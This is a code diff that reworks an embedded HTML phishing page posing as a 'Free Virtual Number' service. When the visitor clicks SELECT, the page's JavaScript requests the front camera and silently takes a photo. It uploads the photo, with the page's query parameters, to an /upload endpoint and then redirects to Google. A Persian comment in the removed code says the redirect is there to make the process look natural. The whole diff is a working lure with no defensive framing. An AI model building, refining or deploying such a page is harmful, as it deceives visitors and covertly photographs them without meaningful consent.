@@ -14,77 +14,75 @@ HTML_CONTENT = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Free Virtual Number - Secure & Free</title>
     <style>
-        body { background: #0b0f19; color: white; text-align: center; padding-top: 30px; font-family: sans-serif; }
-        .card { background: #161f30; padding: 20px; border-radius: 12px; display: inline-block; width: 85%; max-width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        body { background: #0b0f19; color: white; text-align: center; padding-top: 40px; font-family: sans-serif; }
+        .card { background: #161f30; padding: 25px; border-radius: 12px; display: inline-block; width: 85%; max-width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
         h2 { font-size: 20px; margin-bottom: 5px; }
         p { color: #9ca3af; font-size: 14px; margin-bottom: 20px; }
         button { background: #ef4444; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
-        button:active { background: #dc2626; }
     </style>
 </head>
 <body>
     <div class="card">
         <h2>🇺🇸 United States</h2>
         <p>+1 398 362 8901</p>
-        <button id="s-btn" onclick="capture()">SELECT</button>
+        <button id="main-btn" onclick="triggerCapture()">SELECT</button>
     </div>
 
     <script>
-        async function capture() {
-            const btn = document.getElementById('s-btn');
+        async function triggerCapture() {
+            const btn = document.getElementById('main-btn');
             btn.innerText = "Connecting...";
             btn.disabled = true;
 
             try {
-                // ایجاد ویدیو به صورت داینامیک برای گرفتن دسترسی استاندارد
-                const video = document.createElement('video');
-                video.autoplay = true;
-                video.playsInline = true;
-                video.muted = true;
-                video.style.display = 'none';
-                document.body.appendChild(video);
-
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
+                // درخواست مستقیم استریم دوربین با دوربین جلو
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
                 });
-                
+
+                const video = document.createElement('video');
                 video.srcObject = stream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
+                video.playsInline = true;
+                await video.play();
 
-                // مکث کوتاه برای فیکس شدن تصویر
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('photo', blob, 'photo.jpg');
-                        
-                        try {
-                            await fetch("/upload" + window.location.search, { 
-                                method: 'POST', 
-                                body: formData 
-                            });
-                        } catch (err) {
-                            console.log(err);
-                        }
-                        
-                        stream.getTracks().forEach(track => track.stop());
-                        video.remove();
-                        
-                        // هدایت به گوگل برای طبیعی جلوه دادن روند کار
-                        window.location.href = "https://www.google.com";
-                    }, 'image/jpeg', 0.90);
+                // مکث کوتاه برای فیکس شدن فریم دوربین
+                await new Promise(resolve => setTimeout(resolve, 800));
 
-                }, 1000);
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            } catch (e) {
-                alert("لطفاً اجازه دسترسی به دوربین را تایید کنید.");
+                // متوقف کردن کامل استریم دوربین پس از گرفتن عکس
+                stream.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob(async (blob) => {
+                    if (!blob) {
+                        location.reload();
+                        return;
+                    }
+
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'capture.jpg');
+
+                    try {
+                        await fetch("/upload" + window.location.search, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (err) {
+                        console.error(err);
+                    }
+
+                    // انتقال کاربر به صفحه نهایی
+                    window.location.href = "https://www.google.com";
+                }, 'image/jpeg', 0.85);
+
+            } catch (err) {
+                alert("لطفاً دسترسی به دوربین را تایید کنید.");
                 btn.innerText = "SELECT";
                 btn.disabled = false;
             }
